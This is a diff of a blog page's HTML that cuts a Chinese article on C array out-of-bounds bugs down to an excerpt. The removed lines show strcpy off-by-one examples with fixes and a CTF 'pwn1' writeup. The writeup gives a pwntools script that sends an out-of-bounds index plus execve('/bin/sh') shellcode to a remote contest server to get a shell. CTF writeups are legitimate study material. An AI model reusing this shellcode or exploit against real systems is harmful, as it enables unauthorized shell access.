@@ -271,7 +271,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>#数组的下标越界</p>
+              <p>#数组的下标越界</p>
 <p><strong>下标越界</strong></p>
 <p>在引用数组元素时，使用的下标超过了该数组下标的应有范围，但应注意的是:</p>
 <pre><code>C/C++不对数组做边界检查。 可以重写数组的每一端，并写入一些其他变量的
@@ -280,86 +280,8 @@
 码用于程序运行时检测下标是否越界，这就会导致程序的运行速度下降，所以
 为了程序的运行效率，C / C++才不检查下标是否越界。发现如果数组下标越
 界了，那么它会自动接着那块内存往后写。 
-</code></pre><p>关于C/C++为什么不对数组的下标是否越界做检查，可以参考：<br>This is an <a href="http://www.xuebuyuan.com/967089.html" target="_blank" rel="external">http://www.xuebuyuan.com/967089.html</a></p>
-<p>因为编译器不会自动检测你的数组下标是否越界，而是把这个任务交给了程序员自己，所以我们在写程序，引用数组元素时，一定注意不要让数组的下标越界。</p>
-<p>还有，初学者一定不能忘了数组的下标是从0开始的，不是常识中的从1开始。</p>
-<p>例一</p>
-<pre><code>1    void test1()
-2    {
-3        char string[10];
-4        char* str1 = &quot;0123456789&quot;;
-5        strcpy(string, str1);
-6    }
-</code></pre><p>例二</p>
-<pre><code>1    void test2()
-2    {
-3        char string[10], str1[10];
-4        int i;
-5        for(i=0; i&lt;10; i++)
-6        {
-7            str1[i] = &apos;a&apos;;
-8        }
-9        strcpy(string, str1);
-10   }
-</code></pre><p>例三</p>
-<pre><code>1    void test3(char* str1)
-2    {
-3        char string[10];
-4        if(strlen(str1) &lt;= 10)
-5        {
-6            strcpy(string, str1); 
-7        }
-8    }
-</code></pre><p>这3个例子都有数组越界的问题。</p>
-<p>例一中，string是一个含有10个元素的字符数组，str1指向的字符串长度为10，在进行strcpy调用时，会将str1的结束符也复制到string数组里，即复制的字符个数为11，这样会导致string出现数组越界。程序不一定会因此而崩溃，但这是一个潜在的危险。解决办法是将string的元素个数定义为11。</p>
-<p>例二中，str1和string都是含有10个元素的字符数组，并且str1的元素全部被赋为字符”a”，然后再调用strcpy。这里会出现以下两个问题：一个问题是str1表示的字符数组没有以’\0’结束，在随后调用strcpy时无法判断什么时候复制结束；另一个问题是string的数组长度不够，出现数组越界的现象。解决办法是将string和str1的元素个数都定义为11个，并在调用strcpy之前加入一条语句把str1[10]赋为’\0’。</p>
-<p>例三中，if语句使用小于等于”&lt;=”进行比较，如果str1的长度等于10，也会出现数组越界的情况。解决办法是把”&lt;=”换成”&lt;”。</p>
-<p>改正后的程序如下所示。</p>
-<p>例一</p>
-<pre><code>1    void test1()
-2    {
-3        char string[11];           //字符数组长度为11，多分配一个
-4        char* str1 = &quot;0123456789&quot;;
-5        strcpy(string, str1);
-6    }
-</code></pre><p>例二</p>
-<pre><code>1    void test2()
-2    {
-3        char string[11], str1[11];   //字符数组长度都为11，均多分配一个
-4        int i;
-5        for(i=0; i&lt;10; i++)
-6        {
-7            str1[i] = &apos;a&apos;;
-8        }
-9        str1[10] = &apos;\0&apos;;            //初始化str1为空字符串
-10       strcpy(string, str1);
-11   }
-</code></pre><p>例三</p>
-<pre><code>1    void test3(char*str1)
-2    {
-3        char string[10];
-4        if(strlen(str1) &lt; 10)        //不能用&lt;=
-5        {
-6            strcpy(string, str1); 
-7        }
-8    }
-</code></pre><p>##i春秋30强挑战赛pwn1 writeup</p>
-<p>在输入操作下标时没有检测是否越界，通过数组越界读获取获取伪造的函数指针执行 shellcode。</p>
-<p><img src="http://sh3ll.me/images/2016/07/04/ichunqiu-1.png" alt=""><br><img src="http://sh3ll.me/images/2016/07/04/ichunqiu-2.png" alt=""></p>
-<p>通过GDB调试，发现发送29控制eip，nx：disabled，布置好shellcode后直接getshell。</p>
-<p><img src="http://a1.qpic.cn/psb?/V14JgGr112jeEy/ZsK6c1kSjVyLYonikHdZi3XkgJhvb3L2bgrr7QIXazg!/b/dAUBAAAAAAAA&amp;bo=BQFxAAAAAAADB1c!&amp;rf=viewer_4" alt=""></p>
-<p><img src="http://a3.qpic.cn/psb?/V14JgGr112jeEy/Ud2B5WDbmnldBKpmCqkHPVuCrBJFu2Z7ViccuTGYEUA!/b/dPgAAAAAAAAA&amp;bo=vQKAAgAAAAADBx8!&amp;rf=viewer_4" alt=""></p>
-<p><strong>利用代码</strong></p>
-<pre><code>from pwn import *
-# io = process(&quot;./tc1&quot;)
-io = remote(&quot;106.75.9.11&quot;, 20000)
-io.recvuntil(&quot;4. Divide&quot;)
-io.sendline(&quot;29&quot;)
-io.recvuntil(&quot;[123 110]&quot;)
-payload = p32(0x804a0a4) + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;
-io.sendline(payload)
-io.interactive()
 </code></pre>
+          
       
     </div>
     
@@ -372,6 +294,10 @@ io.interactive()
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writup/">writup</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a  href="/2016/08/09/pwn之-数组下标越界/#more">大航海 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
